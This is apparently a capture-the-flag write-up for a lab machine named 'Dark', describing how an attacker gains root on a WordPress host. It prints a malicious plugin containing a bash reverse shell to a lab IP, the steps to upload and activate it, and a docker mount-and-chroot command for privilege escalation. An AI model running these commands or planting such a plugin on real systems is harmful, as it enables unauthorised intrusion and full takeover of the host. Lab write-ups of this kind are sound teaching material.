Summary
Dark: A vulnerable WordPress plugin allows for arbitrary RCE, which lets the attacker establish a reverse connection as the www-data user. Enumeration of our user shows we are in the docker group. Using deepce (Docker Enumeration, Escalation of Privileges and Container Escapes) we can abuse our docker permissions to escalate our privileges to root.

[03] Uploading a malicious .zip

Usually with WordPress sites, the go-to is to edit the source code of any page (I typically use the main or 404 page) to add malicious PHP code. However, we have to upload a malicious plugin instead, since our code is being sanitized. To do this, we create our own plugin: 

<?php
/**
 * Plugin Name: My Shell
 * Author: grehaus
 */

exec("/bin/bash -c 'bash -i >& /dev/tcp/10.200.72.210/9001 0>&1'")
?>

Save that as shell.php, zip it with zip shell.zip shell.php, then upload it via Plugins → Add New → Upload Plugin → select shell.zip → Install Now → start listener → Activate plugin.

[05] Privilege escalation

From the output we can see that we are able to escalate our privileges by mounting the host system. First we need to upgrade to a proper TTY using python3 -c 'import pty;pty.spawn("/bin/bash")'. Then, following the suggested link, we simply need to run docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash — and we're root.
